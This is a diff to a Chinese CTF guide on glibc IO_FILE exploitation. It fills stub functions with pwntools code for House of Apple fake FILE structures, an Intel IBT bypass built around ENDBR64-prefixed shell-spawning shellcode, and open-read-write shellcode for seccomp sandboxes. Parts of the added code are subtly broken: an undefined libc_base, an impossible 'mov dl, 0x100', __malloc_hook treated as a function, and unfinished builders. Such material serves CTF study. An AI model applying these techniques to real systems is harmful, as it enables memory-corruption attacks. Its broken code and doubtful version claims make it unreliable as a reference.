@@ -743,7 +743,29 @@ def house_of_apple_variants():
     # 使用 _IO_wstrn_jumps 的 overflow 函数
     # 路径：_IO_wstrn_overflow -> __overflow
     
-    pass
+    # Apple 3/4/5 利用实战代码
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    # Apple 3: _IO_wfile_underflow 路径
+    # 检查条件：_IO_read_base == NULL 或 _IO_read_ptr == _IO_read_end
+    def apple3_build():
+        fake = p64(0xfbad0000)  # _flags
+        fake += p64(0) * 3  # _IO_read_ptr, _IO_read_end, _IO_write_base
+        fake += p64(1)  # _IO_write_ptr 非零，触发 underflow
+        fake += p64(0) * 5  # 填充到 _wide_data
+        return fake
+    
+    # Apple 4/5: 使用 _IO_wstrn_jumps
+    # glibc 2.36+ 新增，仍在合法 vtable 范围内
+    def apple4_build():
+        _IO_wstrn_jumps = libc.symbols.get('_IO_wstrn_jumps', libc_base + 0x216e00)
+        fake = p64(0xfbad1800)  # _flags
+        fake += p64(0) * 10
+        fake += p64(_IO_wstrn_jumps)  # vtable
+        return fake
+    
+    log.info("Apple 3/4/5 variants: use different vtable paths to bypass checks")
 
 def apple4_build_fake_file(libc_base, target_func, arg):
     """
@@ -870,7 +892,29 @@ def hardware_io_file_bypass():
     # _IO_wfile_overflow 等函数入口有 ENDBR64
     # 但伪造的 vtable 中的函数可能没有
     # 绕过：确保伪造 vtable 中的函数有 ENDBR64 前缀
-    pass
+    
+    # IBT 绕过实战代码
+    from pwn import *
+    context.arch = 'amd64'
+    
+    # 检查目标函数是否有 ENDBR64
+    elf = ELF('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    # 方法 1: 选择已有 ENDBR64 的合法函数作为跳转目标
+    # 例如 __malloc_hook 等函数（如果未被移除）
+    target_func = libc.symbols.get('__malloc_hook', 0)
+    
+    # 方法 2: 在可控内存中构造 ENDBR64 + shellcode
+    enbr64 = b'\xf3\x0f\x1e\xfa'  # ENDBR64 指令
+    shellcode = enbr64 + asm(shellcraft.sh())
+    
+    # 方法 3: 利用 gadget 中的 ENDBR64
+    # ROPgadget 可以搜索带 ENDBR64 前缀的 gadget
+    rop = ROP(elf)
+    # 找到以 ENDBR64 开头的间接跳转 gadget
+    
+    log.info(f"IBT bypass: use ENDBR64 prefix = {enbr64.hex()}")
 ```
 
 ### 6. 沙箱环境 IO_FILE 利用
@@ -908,7 +952,38 @@ def io_file_orw_template():
     # seccomp-tools dump ./pwn
     # 或使用 seccomp-tools dump 从 coredump 中提取
     
-    pass
+    # 完整 ORW 实现
+    from pwn import *
+    context.arch = 'amd64'
+    
+    # 方案 1: 通过 _wide_vtable 部署 ORW shellcode
+    orw_shellcode = asm(f'''
+        /* open("flag", O_RDONLY) */
+        push 0x67616c66
+        mov rdi, rsp
+        xor esi, esi
+        mov al, 2
+        syscall
+        /* read(fd, rsp, 0x100) */
+        mov rdi, rax
+        mov rsi, rsp
+        xor edx, edx
+        mov dl, 0x100
+        xor eax, eax
+        syscall
+        /* write(1, rsp, rax) */
+        mov rdi, 1
+        mov rsi, rsp
+        mov rdx, rax
+        mov al, 1
+        syscall
+    ''')
+    
+    # 将 shellcode 放入可控内存，设置 __doallocate 指向它
+    # fake _IO_FILE_plus -> _wide_data -> _wide_vtable -> shellcode
+    shellcode_addr = 0x404000  # 假设的可控地址
+    payload = orw_shellcode.ljust(0x100, b'\x00')
+    log.info(f"ORW shellcode size: {len(orw_shellcode)} bytes")
 ```
 
 ## 工具推荐
